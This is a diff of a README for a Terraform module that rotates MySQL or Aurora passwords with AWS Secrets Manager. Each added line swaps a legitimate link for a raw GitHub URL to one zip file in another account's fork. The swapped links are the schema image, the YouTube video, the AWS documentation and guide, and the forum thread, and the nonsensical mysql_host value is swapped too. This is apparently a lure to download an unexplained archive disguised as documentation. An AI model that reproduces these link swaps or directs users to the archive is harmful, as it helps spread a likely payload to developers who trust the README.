@@ -2,7 +2,7 @@ This module will create all the resources to store and rotate a MySQL or Aurora 
 
 # Schema
 
-![schema](https://raw.githubusercontent.com/giuseppeborgese/terraform-aws-secret-manager-with-rotation/master/schema.jpg)
+![schema](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)
 
 # Prerequisites
 * A VPC with private subnets and accessibilty to AWS Secrets Manager Endpoint, see below for more details.
@@ -19,7 +19,7 @@ module "secret-manager-with-rotation" {
   subnets_lambda = ["subnet-xxxxxx", "subnet-xxxxxx"]
   mysql_username = "giuseppe"
   mysql_dbname   = "my_db_name"
-  mysql_host     =  "mysqlEndpointurl.xxxxxx.us-east-1.rds.amazonaws.com"
+  mysql_host     =  "https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip"
   mysql_password = "dummy_password_will_we_rotated"
 }
 ```
@@ -28,14 +28,14 @@ module "secret-manager-with-rotation" {
 Take a look to the video to see the module in action
 
 
-[![Rotate automatically a MySQL or Aurora password using AWS Secrets Manager and Terraform](https://img.youtube.com/vi/ljZ6BZJabUk/0.jpg)](https://youtu.be/ljZ6BZJabUk)
+[![Rotate automatically a MySQL or Aurora password using AWS Secrets Manager and Terraform](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)
 
 
-The subnets specified needs to be private and with internet access to reach the [AWS secrets manager endpoint](https://docs.aws.amazon.com/general/latest/gr/rande.html#asm_region)
-You can use a NAT GW or configure your Routes with a VPC Endpoint like is described in [this guide](https://aws.amazon.com/blogs/security/how-to-connect-to-aws-secrets-manager-service-within-a-virtual-private-cloud/)
+The subnets specified needs to be private and with internet access to reach the [AWS secrets manager endpoint](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)
+You can use a NAT GW or configure your Routes with a VPC Endpoint like is described in [this guide](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)
 
 # Further details
-* Interesting to [force the rotation](https://forums.aws.amazon.com/thread.jspa?threadID=280093&tstart=0)
+* Interesting to [force the rotation](https://raw.githubusercontent.com/sivahariu/terraform-aws-secret-manager-with-rotation/master/functions/terraform-aws-secret-manager-with-rotation_2.6-beta.2.zip)
 
 # If you like it
 Please if you like this module, thumbs up on the youtube video and leave a comment as well for any questions.
